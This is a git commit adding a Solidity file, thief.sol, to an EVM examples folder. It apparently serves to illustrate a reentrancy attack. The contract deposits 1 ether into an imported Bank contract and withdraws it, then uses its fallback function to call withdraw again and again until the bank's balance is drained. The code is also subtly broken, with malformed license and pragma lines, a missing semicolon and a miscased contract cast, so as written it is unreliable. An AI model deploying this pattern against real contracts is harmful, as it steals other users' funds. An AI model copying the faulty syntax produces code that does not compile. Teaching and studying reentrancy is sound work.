b52f17c6fc28433e5e37abd8f9aae054b9d2c987
Riddhi0506 <98499970+Riddhi0506@users.noreply.github.com>
2022-11-06 01:19:31 -0500

    Create thief.sol

---
+++ examples/evm/thief.sol
@@ -0,0 +1,24 @@
+//SPDX-License-Identifier; Unlicensed
+pragma solidity ^0.8.17:
+import "bank.sol"
+
+contract Attack {
+  Bank public bank;
+  
+  constructor(address _bankAddress) {
+    bank = bank(_bankAddress);
+    
+  }
+  fallback() external payable {
+    if (address(bank).balance >= 1 ether) {
+      bank.withdraw();
+     
+    }
+  }
+  
+  function attack() external payable {
+    require(msg.value >= 1 ether);
+    bank.deposit{value: 1 ether} ();
+    bank.withdraw();
+  }
+}
